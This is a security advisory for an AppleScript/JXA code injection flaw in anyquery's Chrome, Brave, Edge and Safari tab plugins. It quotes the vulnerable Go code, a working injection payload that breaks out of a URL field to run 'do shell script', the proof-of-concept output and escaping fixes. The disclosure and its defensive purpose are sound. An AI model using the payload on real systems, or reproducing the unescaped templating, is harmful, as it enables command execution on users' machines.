# [C] Anyquery: AppleScript/JXA Code Injection via Unescaped URL in macOS Chrome Plugin

## Summary
Severity: Critical
Advisory: GHSA-hrj8-hjv8-mgwc
CVE: CVE-2026-47252
CWE: CWE-94
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-08
Source: https://github.com/advisories/GHSA-hrj8-hjv8-mgwc
Type: github-advisory

## Affected
- Go: `github.com/julien040/anyquery/plugins/chrome` — affected >=0 <0.0.0-20240826075852-c651df0b8767
- Go: `github.com/julien040/anyquery/plugins/brave` — affected >=0 <0.0.0-20240826075852-c651df0b8767
- Go: `github.com/julien040/anyquery/plugins/edge` — affected >=0 <0.0.0-20240826075852-c651df0b8767
- Go: `github.com/julien040/anyquery/plugins/safari` — affected >=0 <0.0.0-20240826075852-c651df0b8767

## Details
# AppleScript/JXA Code Injection via Unescaped URL in macOS Chrome Plugin

| Field            | Value |
| ---------------- | ----- |
| Repository       | julien040/anyquery |
| Affected version | 0.4.4 (commit 0abd460) |
| Vulnerability    | CWE-94 — Improper Control of Generation of Code |
| Severity         | High |

## Summary

The `chrome_tabs` plugin (and equivalent Brave/Edge/Safari variants) interpolates a SQL-controlled `url` value directly into an AppleScript template via `fmt.Sprintf(newTabScript, url)` at `plugins/chrome/tabs.go:141` without any escaping, then passes the result to `exec.Command("osascript", "-e", ...)`. An authenticated anyquery user who can issue SQL `INSERT INTO chrome_tabs` statements — which requires local CLI access — can break out of the `{URL:"..."}` property record with a newline-containing payload and inject arbitrary AppleScript statements, including `do shell script`, achieving OS-level command execution on the macOS host. The same pattern applies to the `Update` path at `tabs.go:169` via the JXA `setURL.js` script.

## Affected Code

`plugins/chrome/tabs.go:141` — SQL-supplied `url` interpolated unescaped into AppleScript template, then executed via `osascript -e`

```go
func (t *tabsTable) Insert(rows [][]interface{}) error {
	for _, row := range rows {
		url := "chrome://newtab/"
		if rawURL, ok := row[2].(string); ok {
			url = rawURL
		}

		cmd := exec.Command("osascript", "-e", fmt.Sprintf(newTabScript, url))
		output, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("can't run osascript: %W (message: %s)\n Script: %s", err, output, fmt.Sprintf(newTabScript, url))
		}

	}

	return nil
}
```

`plugins/chrome/tabs.go:169` — `Update` path interpolates `url` into JXA `setURL.js` template with identical lack of escaping

```go
		if url != "" {
			cmd := exec.Command("osascript", "-l", "JavaScript", "-e", fmt.Sprintf(setURLScript, pk, url))
			output, err := cmd.CombinedOutput()
			if err != nil {
				return fmt.Errorf("can't run osascript: %W (message: %s)\n Script: %s", err, output, fmt.Sprintf(setURLScript, pk, url))
			}
		}
```

SQL INSERT `url` column (row[2]) flows through `tabsTable.Insert` → `fmt.Sprintf(newTabScript, url)` → `exec.Command("osascript", "-e", <injected script>)` at `tabs.go:141`.

## Proof of Concept

Step 1 — Insert a newline-bearing URL via SQL: the generated AppleScript closes the `{URL:"..."}` property record and appends an injected `do shell script "id"` block, which is passed verbatim to `osascript -e`.

```bash
docker build -f Dockerfile -t anyquery-vuln001 .
docker run --rm anyquery-vuln001 'x"}
end tell
do shell script "id"
tell application "Google Chrome"
        make new tab with properties {URL:"done'
```

```text
SQL equivalent: INSERT INTO chrome_tabs (url) VALUES ('<INJECT_URL>')
where INJECT_URL =
x"}
end tell
do shell script "id"
tell application "Google Chrome"
	make new tab with properties {URL:"done
```

```text
[sink:tabs.go:141] Script passed to osascript -e:
tell application "Google Chrome"
        make new tab with properties {URL:"x"}
end tell
do shell script "id"
tell application "Google Chrome"
        make new tab with properties {URL:"done"} at end of tabs of first window
end tell
[mock-osascript] Received script:
tell application "Google Chrome"
        make new tab with properties {URL:"x"}
end tell
do shell script "id"
tell application "Google Chrome"
        make new tab with properties {URL:"done"} at end of tabs of first window
end tell

RESULT: PASS — injection payload reached osascript -e verbatim; "do shell script \"id\"" present in generated script (tabs.go:141)
```

See attached files: Dockerfile, poc/inject_demo.go, poc/go.mod
[vuln-001.zip](https://github.com/user-attachments/files/27945214/vuln-001.zip)

## Impact

Any local user authenticated to the anyquery CLI who can run SQL against the `chrome_tabs` virtual table can achieve arbitrary OS command execution on the macOS host with the privileges of the anyquery process. Because anyquery exposes its SQL interface over an HTTP server (accessible to any user who can reach the endpoint), this can be exploited by any client with INSERT or UPDATE access to the browser-tab plugins, without requiring Chrome credentials or macOS admin rights. The injected AppleScript runs under the user's macOS session, giving access to the file system, keychain prompts, and any application scriptable via Apple Events.

## Remediation

Escape double-quote and newline characters in the `url` value before interpolation, or avoid string templating entirely. Specifically in `plugins/chrome/tabs.go`:

```go
// Replace fmt.Sprintf(newTabScript, url) with:
safeURL := strings.ReplaceAll(url, `"`, `\"`)
safeURL = strings.ReplaceAll(safeURL, "\n", "")
safeURL = strings.ReplaceAll(safeURL, "\r", "")
cmd := exec.Command("osascript", "-e", fmt.Sprintf(newTabScript, safeURL))
```

A more robust fix is to pass the URL as an AppleScript variable declared via a `-e` prefix argument rather than string-interpolating it into the script body, or to use the `osascript` `argv` mechanism so the URL never appears inside the script source. Apply the same fix to `fmt.Sprintf(setURLScript, pk, url)` at `tabs.go:169` for the `Update` path. Validate that the URL conforms to an allowed scheme (`https://`, `http://`, `chrome://`) before passing it to either handler.

## References
- https://github.com/julien040/anyquery/security/advisories/GHSA-hrj8-hjv8-mgwc
- https://github.com/julien040/anyquery
